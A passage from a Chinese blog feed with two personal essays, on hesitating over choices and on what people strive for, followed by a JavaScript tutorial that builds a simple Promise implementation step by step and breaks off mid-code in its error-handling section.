        <content type="html"><![CDATA[<p>在这个时代，我们时刻被无数的信息环绕着，甚至连我们呼吸的空气都填满了电磁波。随着高新技术的发展，获取信息的渠道多了，获得的信息量也大了。可是，当我们面对选择的时候，却更加地畏首畏尾了。</p><p>在面对选择的时候，很多人会表现出惯性的谨慎，他会不会骗我呀，这东西是不是真的好用啊，会不会明天价格更低呢等等。说到这里，我想起很多人在代购网站上购买 iPhone，他们每天关注 iPhone 的价格，今天涨了三十，前天跌了五十，死死的盯住百位数字，就盼着它减一减二。</p><p>三分把握不出手，五分把握不出手，八分把握还在犹豫，当晃过神来的时候，最佳的机会已经在我们迟疑的那一刹那，飘向了远方。</p><p>你会诧异那些貌似比你弱的人，为什么他们更容易抓住机遇。然后就开始纳闷了，我底子比人家好，思维比人家灵活，手脚也比人家麻利，可为何上帝总是把机会留给比我“差”的人呢？</p><p>我们总会期待在选择的前一刻，被选择的东西会有更大的增值。贪婪是人的本性，我们期望在交易的过程中，自己占据优胜的一方，所以在遇到可以选择或者可以等待的交易时，潜意识趋向于再等一等，当你按耐不住的时候突然变得十分积极，然后涌上去干上一笔。也可能是，你一直忍着，心动而行不动，最后看着那个可能美好的东西离你而去。</p><p>说到底，我们不敢选择，是因为我们没有底气。比如在购物方面，如果给你一百万，你还会犹豫牙膏是买三块五的还是三十五的么？底气从哪里来，一方面是有一个声音在鼓励你，这个底气来自最原始的你，也就是你的潜意识；还有一方面是来自物质基础，你不用考虑这些东西是否值得买，因为买不买都不影响什么。</p><p>当然，选择也和个人的知识广度有关系。一个历经沧桑的百岁老人和一个毛都没长全的楞头小子，前者在选择时思考的会更多，犹豫也会更多，当然，得到的也可能更多。但是在这个高速发展的信息时代，我们是否真的有时间去思考？</p><p>有人说，互联网思维就是：举枪-&gt;射击-&gt;瞄准。我们没那么多时间去做好充分的准备，打完一枪再去看看是不是瞄准了，很多价值就是在胡乱开枪的时候创造出来的。</p><p>再说个有趣的选择问题。选择在男女之间也有很明显的差异，举个生活中的例子：大多数女生在买洗发水的时候，会看一看、问一问、比一比，再认真考量下，最后可能还是不买。她们在生活中已经养成了这种习惯。而男生，看到瓶子上写了“洗发水”三个字，基本就可以确定要的东西了。选择也分性别：）。</p><p>“不敢选择，在怕什么？”。</p><p>你在怕什么，能说说么？</p>]]></content>
      
      
      <categories>
          
          <category> 笔记本 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我们在追求什么？</title>
      <link href="/blog/2014/10/02/what-is-our-persuits/"/>
      <url>/blog/2014/10/02/what-is-our-persuits/</url>
      
        <content type="html"><![CDATA[<p>最近看阮一峰写的《如何变得有思想？》，脑中不时冒出诸多问题：</p><ul><li>工作是为了什么？</li><li>我们活着是为了什么？</li><li>如何实现自己的价值？</li><li>我有思想么？</li><li>钱很重要么？</li><li>…</li></ul><p>可能在你感觉前路弥漫、驻足之时，也会思考这几个问题。</p><p>有些人奋斗了很多年，突然看到一个比自己年轻三五七八岁的小伙，在自己专注的领域远胜于自己，内心不免有些淡淡的忧伤。这些都是可以理解的。为了超越自己，为了找到更好的归宿，我们费尽心机，奋力拼搏，可到了最后，发现自己的努力一文不值（或者只指一文）时，那感觉就像从万丈悬崖跌落，心里空洞了许多。</p><p>我们在追求什么？月薪3000的人在大城市漂泊，他们在寻求更安稳的生存之道，月薪3w的人在追求更好的生活。“生存之道”和“生活”，这两个词未免也显得也太抽象了，我只知道，很少会有人满足。</p><p>不知为何会思考这个话题，但随着文字洒落下来，这种思绪又渐渐弥散了…</p>]]></content>
      
      
      <categories>
          
          <category> 笔记本 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>细嗅Promise</title>
      <link href="/blog/2014/09/29/cb-promise/"/>
      <url>/blog/2014/09/29/cb-promise/</url>
      
        <content type="html"><![CDATA[<p id="_1">读完这篇文章，预计会消耗你 40 分钟的时间。<a class="headeranchor-link" name="user-content-_1" href="#_1"></a></p><p>Ajax 出现的时候，刮来了一阵异步之风，现在 Nodejs 火爆，又一阵异步狂风刮了过来。需求是越来越苛刻，用户对性能的要求也是越来越高，随之而来的是页面异步操作指数般增长，如果不能恰当的控制代码逻辑，我们就会陷入无穷的回调地狱中。</p><p>ECMAScript 6 已经将异步操作纳入了规范，现代浏览器也内置了 Promise 对象供我们进行异步编程，那么此刻，还在等啥？赶紧学习学习 Promise 的内部原理吧！</p><h3 id="promise_1"><a class="headeranchor-link" name="user-content-promise_1" href="#promise_1"></a>第一章 了解 Promise</h3><h4 id="_2"><a class="headeranchor-link" name="user-content-_2" href="#_2"></a>一、场景再现</h4><p>由于 javascript 的单线程性质，我们必须等待上一个事件执行完成才能处理下一步，如下：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// DOM ready之后执行</span></span><br><span class="line">$(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">// 获取模板</span></span><br><span class="line">    $.<span class="title function_">get</span>(url, <span class="keyword">function</span>(<span class="params">tpl</span>)&#123;</span><br><span class="line">        <span class="comment">// 获取数据</span></span><br><span class="line">        $.<span class="title function_">get</span>(url2, <span class="keyword">function</span>(<span class="params">data</span>)&#123;</span><br><span class="line">            <span class="comment">// 构建 DOMString</span></span><br><span class="line">            <span class="title function_">makeHtml</span>(tpl, data, <span class="keyword">function</span>(<span class="params">str</span>)&#123;</span><br><span class="line">                <span class="comment">// 插入到 DOM 中</span></span><br><span class="line">                $(obj).<span class="title function_">html</span>(str);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>为了减少首屏数据的加载，我们将一些模板和所有数据都放在服务器端，当用户操作某个按钮时，需要将模板和数据拼接起来插入到 DOM 中，这个过程还必须在 DOMReady 之后才能执行。这种情况是十分常见的，如果异步操作再多一些，整个代码的缩进让人看着很不舒服，为了优雅地处理这个问题，ECMAScript 6 引入了 Promise 的概念，目前一些现代浏览器已经支持这些新东西了！</p><h4 id="_3"><a class="headeranchor-link" name="user-content-_3" href="#_3"></a>二、模型</h4><p>为了让代码流程更加清晰，我们假想着能够按照下面的流程来跑程序：</p><figure class="highlight scss"><table><tr><td class="code"><pre><span class="line">new <span class="built_in">Promise</span>(ready)<span class="selector-class">.then</span>(getTpl)<span class="selector-class">.then</span>(getData)<span class="selector-class">.then</span>(makeHtml)<span class="selector-class">.resolve</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先将要事务按照执行顺序依次 push 到事务队列中，push 完了之后再通过 resolve 函数启动整个流程。</p><p>整个流程的操作模型如下：</p><figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line">promise(ok).then(ok_1).then(ok_2).then(ok_3).reslove(value)------+</span><br><span class="line">         |<span class="string">         </span>|<span class="string">          </span>|<span class="string">          </span>|<span class="string">                       </span>|</span><br><span class="line">         |<span class="string">         </span>|<span class="string">          </span>|<span class="string">          </span>|<span class="string">        +=======+      </span>|</span><br><span class="line">         |<span class="string">         </span>|<span class="string">          </span>|<span class="string">          </span>|<span class="string">        </span>|<span class="string">       </span>|<span class="string">      </span>|</span><br><span class="line">         |<span class="string">         </span>|<span class="string">          </span>|<span class="string">          </span>|<span class="string">        </span>|<span class="string">       </span>|<span class="string">      </span>|</span><br><span class="line">         +---------|<span class="string">----------</span>|<span class="string">----------</span>|<span class="string">--------→  ok() ←------+</span></span><br><span class="line"><span class="string">                   </span>|<span class="string">          </span>|<span class="string">          </span>|<span class="string">        </span>|<span class="string">   ↓   </span>|</span><br><span class="line">                   |<span class="string">          </span>|<span class="string">          </span>|<span class="string">        </span>|<span class="string">   ↓   </span>|</span><br><span class="line">                   +----------|<span class="string">----------</span>|<span class="string">--------→ ok_1()</span>|</span><br><span class="line">                              |<span class="string">          </span>|<span class="string">        </span>|<span class="string">   ↓   </span>|</span><br><span class="line">                              |<span class="string">          </span>|<span class="string">        </span>|<span class="string">   ↓   </span>|</span><br><span class="line">                              +----------|<span class="string">--------→ ok_2()</span>|</span><br><span class="line">                                         |<span class="string">        </span>|<span class="string">   ↓   </span>|</span><br><span class="line">                                         |<span class="string">        </span>|<span class="string">   ↓   </span>|</span><br><span class="line">                                         +--------→ ok_3()-----+</span><br><span class="line">                                                  |<span class="string">       </span>|<span class="string">    </span>|</span><br><span class="line">                                                  |<span class="string">       </span>|<span class="string">    ↓</span></span><br><span class="line"><span class="string">@ Created By Barret Lee                           +=======+   exit</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>在 resolve 之前，promise 的每一个 then 都会将回调函数压入队列，resolve 后，将 resolve 的值送给队列的第一个函数，第一个函数执行完毕后，将执行结果再送入下一个函数，依次执行完队列。一连串下来，一气呵成，没有丝毫间断。</p><h4 id="_4"><a class="headeranchor-link" name="user-content-_4" href="#_4"></a>三、简单的封装</h4><p>如果了解 Promise，可以移步下方，看看对 Promise 的封装：</p><p>Github: <a href="//github.com/barretlee/myPromise" target="_blank">//github.com/barretlee/myPromise</a>DEMO: <a href="http://barretlee.github.io/myPromise/index.html" target="_blank">http://barretlee.github.io/myPromise/index.html</a></p><p>如果还不是很了解，可以往下阅读全文，了解一二。</p><h3 id="promise_2"><a class="headeranchor-link" name="user-content-promise_2" href="#promise_2"></a>第二章 Promise 原理</h3><h4 id="promise_3"><a class="headeranchor-link" name="user-content-promise_3" href="#promise_3"></a>一、什么是 Promise ？</h4><p>那么，什么是 Promise ？</p><p>Promise 可以简单理解为一个事务，这个事务存在三种状态：</p><ol><li>已经完成了 resolved</li><li>因为某种原因被中断了 rejected</li><li>还在等待上一个事务结束 pending</li></ol><p>上文中我们举了一个栗子，获取模板和数据之后再将拼合的数据插入到 DOM 中，这里我们将整个程序分解成多个事务：</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">事务一：     获取模板</span><br><span class="line"><span class="code">               ↓</span></span><br><span class="line"><span class="code">事务二：     获取数据</span></span><br><span class="line"><span class="code">               ↓</span></span><br><span class="line"><span class="code">事务三： 拼合之后插入到 DOM</span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure><p>在事务一结束之前，也就是模板代码从服务器拉取过来之前，事务二和事务三都处于 pending 状态，他们必须等待上一个事务结束。而事务一结束之后会将自身状态标记为 resolved，并把该事务中处理的结果移交给事务二继续处理（当然，这里如果没有数据返回，事务二就不会获得上一个事务的数据），依次类推，直到最后一个事务操作结束。</p><p>在事务操作的过程中，若遇到错误，比如事务一获取数据存在跨域问题，那事务就会操作失败，此时它会将自身的状态标记为 rejected，由于后续事务都是承接前一事务的，前一事务已经宣告工程已经玩不成了，那么后续的所有事务都会将自己标记为 rejected，其标记理由（reason）就是出错事务的报错信息（这个报错信息可以使用 try...catch 来捕获，也可以通过程序自身来捕获，如 ajax 的 onerror 事件、ajax 返回的状态码为 404 等）。</p><p><strong>小结：Promise 就是一个事务的管理器。他的作用就是将各种内嵌回调的事务用流水形式表达，其目的是为了简化编程，让代码逻辑更加清晰。</strong></p><p>由于整个程序的实现比较难理解，对于 Promise，我们将分为两部分阐述：</p><ul><li>无错误传递的 Promise，也就是事务不会因为任何原因中断，事务队列中的事项都会被依次处理，此过程中 Promise 只有 pending 和 resolved 两种状态，没有 rejected 状态。</li><li>包含错误的 Promise，每个事务的处理都必须使用容错机制来获取结果，一旦出错，就会将错误信息传递给下一个事务，如果错误信息会影响下一个事务，则下一个事务也会 rejected，如果不会，下一个事务可以正常执行，依次类推。</li></ul><h4 id="promise-promise"><a class="headeranchor-link" name="user-content-promise-promise" href="#promise-promise"></a>二、无错误传递的 Promise（简化版的 Promise）</h4><p>首先，我们需要用一个变量（status）来标记事务的状态，然后将事务（affair）也保存到 Promise 对象中。</p><figure class="highlight wren"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">Promise</span> <span class="operator">=</span> <span class="title function_">function</span>(<span class="params">affair</span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">state</span> <span class="operator">=</span> <span class="string">&quot;pending&quot;</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">affair</span> <span class="operator">=</span> <span class="variable">affair</span> <span class="operator">||</span> <span class="title function_">function</span>(<span class="params">o</span>) &#123; <span class="keyword">return</span> <span class="variable">o</span>; &#125;;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">allAffairs</span> <span class="operator">=</span> [];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Promise 有两个重要的方法，一个是 then，另一个是 resolve：</p><ul><li>then，将事务添加到事务队列（allAffairs）中</li><li>resolve，开启流程，让整个操作从第一个事务开始执行</li></ul><p>在操作事务之前，我们会先把各种事务依次放入事务队列中，这里会用到 then 方法：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Promise</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">then</span> = <span class="keyword">function</span> (<span class="params">nextAffair</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> promise = <span class="keyword">new</span> <span class="title class_">Promise</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">state</span> == <span class="string">&quot;resloved&quot;</span>)&#123;</span><br><span class="line">        <span class="comment">// 如果当前状态是已完成，则这个事务将会被立即执行</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">_fire</span>(promise, nextAffair);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">// 否则将会被加入队列中</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">_push</span>(promise, nextAffair);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果整个操作已经完成了，那 then 方法送进的事务会被立即执行，</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Promise</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">_fire</span> = <span class="keyword">function</span> (<span class="params">nextPromise, nextAffair</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> nextResult = <span class="title function_">nextAffair</span>(<span class="variable language_">this</span>.<span class="property">result</span>);</span><br><span class="line">    <span class="keyword">if</span> (nextResult <span class="keyword">instanceof</span> <span class="title class_">Promise</span>)&#123;</span><br><span class="line">        nextResult.<span class="title function_">then</span>(<span class="keyword">function</span>(<span class="params">obj</span>)&#123;</span><br><span class="line">            nextPromise.<span class="title function_">resolve</span>(obj);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        nextPromise.<span class="title function_">resolve</span>(nextResult);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> nextPromise;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><span>被立即执行之后会返回一个结果，这个结果会被传递到下一个事务中作为原料，但是这里需要考虑两种情况：</span></pre><ol><li>异步，如果这个结果也是一个 Promise，则需要等待这个 Promise 执行完毕再将最终的结果传到下一个事务中。</li><li>同步，如果这个结果不是 Promise，则直接将结果传递给下一个事务。</li></ol><p>第一种情况还是比较常见的，比如我们在一个事务中有一个子事务队列需要处理，此时必须等待子事务完成才能回到主事务队列中。</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">Promise.prototype.resolve = function (obj)&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.state != <span class="string">&quot;pending&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="string">&quot;流程已完成，不能再次开启流程！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.state = <span class="string">&quot;resloved&quot;</span>;</span><br><span class="line">    <span class="comment">// 执行该事务，并将执行结果寄存到 Promise 管理器上</span></span><br><span class="line">    <span class="keyword">this</span>.result = <span class="keyword">this</span>.affair(obj);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, len = <span class="keyword">this</span>.allAffairs.length; i &lt; len; ++i)&#123;</span><br><span class="line">        <span class="comment">// 往后执行事务</span></span><br><span class="line">        <span class="keyword">var</span> affair = <span class="keyword">this</span>.allAffairs[i];</span><br><span class="line">        <span class="keyword">this</span>._fire(affair.promise, affair.affair);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>resolve 接受一个参数，这个数据是交给第一个事务来处理的，因为第一个事务的启动可能需要点原料，这个数据就是原料，它也可以是空。该事物处理完毕之后，将操作结果（result）寄存在 Promise 对象上，方便引用，然后将结果（result）作为原料送入下一个事务。依次类推。</p><p>我们看到 then 方法中还调用了一个 _push ，这个方法的作用是将事务推进事务管理器（Promise）。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Promise</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">_push</span> = <span class="keyword">function</span> (<span class="params">nextPromise, nextAffair</span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">allAffairs</span>.<span class="title function_">push</span>(&#123;</span><br><span class="line">        <span class="attr">promise</span>: nextPromise,</span><br><span class="line">        <span class="attr">affair</span>: nextAffair</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> nextPromise;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>以上操作，我们就实现了一个简单的事务管理器，可以测试下下面的代码：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 初始化事务管理器</span></span><br><span class="line"><span class="keyword">var</span> promise = <span class="keyword">new</span> Promise(<span class="keyword">function</span>(<span class="params">data</span>)&#123;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(data);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 添加事务</span></span><br><span class="line">promise.then(<span class="keyword">function</span>(<span class="params">data</span>)&#123;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(data);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;).then(<span class="keyword">function</span>(<span class="params">data</span>)&#123;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(data);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">&#125;).then(<span class="keyword">function</span>(<span class="params">data</span>)&#123;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(data);</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&quot;end&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 启动事务</span></span><br><span class="line">promise.resolve(<span class="string">&quot;start&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到依次输出的结果为：</p><figure class="highlight node-repl"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">start</span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript"><span class="number">1</span></span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript"><span class="number">2</span></span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript"><span class="number">3</span></span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">end</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由于上述实现十分简陋，链式调用没做太好的处理，请读者自行完善：）</p><p>下面是一个异步操作演示：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> promise = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="keyword">function</span>(<span class="params">data</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;end&quot;</span>;</span><br><span class="line">&#125;);</span><br><span class="line">promise.<span class="title function_">then</span>(<span class="keyword">function</span>(<span class="params">data</span>)&#123;</span><br><span class="line">    <span class="comment">// 这里需要返回一个 Promise，让主事务切换到子事务处理</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">function</span>(<span class="params">data</span>)&#123;</span><br><span class="line">        <span class="comment">// 创建一个子事务</span></span><br><span class="line">        <span class="keyword">var</span> promise = <span class="keyword">new</span> <span class="title class_">Promise</span>();</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span><br><span class="line">            <span class="comment">// 一秒之后才启动子事务，模拟异步延时</span></span><br><span class="line">            promise.<span class="title function_">resolve</span>();</span><br><span class="line">        &#125;, <span class="number">1000</span>);</span><br><span class="line">        <span class="keyword">return</span> promise;</span><br><span class="line">    &#125;)(data);</span><br><span class="line">&#125;);</span><br><span class="line">promise.<span class="title function_">resolve</span>(<span class="string">&quot;start&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><span>可以看到依次输出的结果为：</span></pre><figure class="highlight node-repl"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">start</span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">end （1s之后输出）</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将函数写的稍微好看点：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">delay</span>(<span class="params">data</span>)&#123;</span><br><span class="line">    <span class="comment">// 创建一个子事务</span></span><br><span class="line">    <span class="keyword">var</span> promise = <span class="keyword">new</span> <span class="title class_">Promise</span>();</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span><br><span class="line">        <span class="comment">// 一秒之后才启动子事务，模拟异步延时</span></span><br><span class="line">        promise.<span class="title function_">resolve</span>();</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">    <span class="keyword">return</span> promise;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 主事务</span></span><br><span class="line"><span class="keyword">var</span> promise = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="keyword">function</span>(<span class="params">data</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;end&quot;</span>;</span><br><span class="line">&#125;);</span><br><span class="line">promise.<span class="title function_">then</span>(delay);</span><br><span class="line">promise.<span class="title function_">resolve</span>(<span class="string">&quot;start&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4><span>三、包含错误传递的 Promise</span></h4><p>真的很羡慕你能看到这么详细的文章，当然，后面会更加精彩！</p><p>没有错误处理的 Promise 只能算是一个半成品，虽说可以通过在最外层加一个 try..catch 来捕获错误，但没法具体定位是哪个事务发生的错误。并且这里的错误不仅仅包含 JavaScript Error，还有诸如 ajax 返回的 data code 不是 200 的情况等。</p><p>先看一个浏览器内置 Promise 的实例（该代码可在现代浏览器下运行）：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> Promise(<span class="keyword">function</span>(<span class="params">resolve, reject</span>)&#123;</span><br><span class="line">    resolve(<span class="string">&quot;start&quot;</span>);</span><br><span class="line">&#125;).then(<span class="keyword">function</span>(<span class="params">data</span>)&#123;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(data);</span><br><span class="line">    throw <span class="string">&quot;error&quot;</span>;</span><br><span class="line">&#125;).catch(<span class="keyword">function</span>(<span class="params">err</span>)&#123;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(err);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;end&quot;</span>;</span><br><span class="line">&#125;).then(<span class="keyword">function</span>(<span class="params">data</span>)&#123;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(data)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><span>Promise 的回调和 then 方法都是接受两个参数：</span></pre><figure class="highlight wren"><table><tr><td class="code"><pre><span class="line"><span class="variable">new</span> <span class="title class_">Promise</span>(<span class="title function_">function</span>(<span class="params">resolve</span>, <span class="params">reject</span>)&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable">promise</span>.<span class="property">then</span>(</span><br><span class="line">    <span class="title function_">function</span>(<span class="params">value</span>)&#123;<span class="comment">/* code here */</span>&#125;,</span><br><span class="line">    <span class="title function_">function</span>(<span class="params">reason</span>)&#123;<span class="comment">/* code here */</span>&#125;</span><br><span class="line">);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>事务处理过程中，如果有值返回，则作为 value，传入到 resolve 函数中，若有错误产生，则作为 reason 传入到 reject 函数中处理。</p><p>在初始化 Promise 对象时，若传入的回调中没有执行 resolve 或者 reject，这需要我们主动去启动事务队列。</p><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">promise.resolve()<span class="comment">;</span></span><br><span class="line">promise.reject()<span class="comment">;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面两种都是可以启动一个队列的。这里跟第二章第二节的 resolve 函数用法类似。Promise 对象还提供了 catch 函数，起用法等价于下面所示：</p><figure class="highlight wren"><table><tr><td class="code"><pre><span class="line"><span class="variable">promise</span>.<span class="property">catch</span>();</span><br><span class="line"><span class="comment">// 等价于</span></span><br><span class="line"><span class="variable">promise</span>.<span class="property">then</span>(<span class="literal">null</span>, <span class="title function_">function</span>(<span class="params">reason</span>)&#123;&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>还有两个 API：</p><figure class="highlight mercury"><table><tr><td class="code"><pre><span class="line"><span class="keyword">promise</span>.<span class="built_in">all</span>();</span><br><span class="line"><span class="keyword">promise</span>.race();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>后续再讲。先看看这个有错误处理的 Promise 是如何实现的。</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">function Promise(resolver)&#123;</span><br><span class="line">    <span class="keyword">this</span>.status = <span class="string">&quot;pending&quot;</span>;</span><br><span class="line">    <span class="keyword">this</span>.value = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">this</span>.handlers = [];</span><br><span class="line">    <span class="keyword">this</span>._doPromise.call(<span class="keyword">this</span>, resolver);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>_doPromise 方法在实例化 Promise 函数时就执行。如果送入的回调函数 resolver 中已经 resolve 或者 reject 了，程序就已经启动了，所以在实例化的时候就开始判断。</p><figure class="highlight wren"><table><tr><td class="code"><pre><span class="line"><span class="variable">_doPromise</span>: <span class="title function_">function</span>(<span class="params">resolver</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">called</span> <span class="operator">=</span> <span class="literal">false</span>, <span class="variable">self</span> <span class="operator">=</span> <span class="variable language_">this</span>;</span><br><span class="line">    <span class="title function_">try</span>&#123;</span><br><span class="line">        <span class="title function_">resolver</span>(<span class="params">function</span>(<span class="params">value</span>)&#123;</span><br><span class="line">            <span class="comment">// 如果没有 call 则继续，并标记 called 为 true</span></span><br><span class="line">            <span class="operator">!</span><span class="variable">called</span> <span class="operator">&amp;&amp;</span> (<span class="variable">called</span> <span class="operator">=</span> <span class="operator">!</span><span class="number">0</span>, <span class="variable">self</span>.<span class="property">resolve</span>(<span class="variable">value</span>));</span><br><span class="line">        &#125;, <span class="title function_">function</span>(<span class="params">reason</span>)&#123;</span><br><span class="line">            <span class="comment">// 同上</span></span><br><span class="line">            <span class="operator">!</span><span class="variable">called</span> <span class="operator">&amp;&amp;</span> (<span class="variable">called</span> <span class="operator">=</span> <span class="operator">!</span><span class="number">0</span>, <span class="variable">self</span>.<span class="property">reject</span>(<span class="variable">reason</span>));</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="title function_">catch</span>(<span class="params">e</span>) &#123;</span><br><span class="line">        <span class="comment">// 同上，捕获错误，传递错误到下一个 then 事务</span></span><br><span class="line">        <span class="operator">!</span><span class="variable">called</span> <span class="operator">&amp;&amp;</span> (<span class="variable">called</span> <span class="operator">=</span> <span class="operator">!</span><span class="number">0</span>, <span class="variable">self</span>.<span class="property">reject</span>(<span class="variable">e</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;,</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>只要 resolve 或者 reject 就会标记程序 called 为 true，表示程序已经启动了。</p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">resolve: function(value) &#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span> === value)&#123;</span><br><span class="line">            <span class="keyword">throw</span> new TypeError(<span class="string">&quot;流程已完成，不能再次开启流程！&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 如果还有子事务队列，继续执行</span></span><br><span class="line">            value &amp;&amp; value.then &amp;&amp; <span 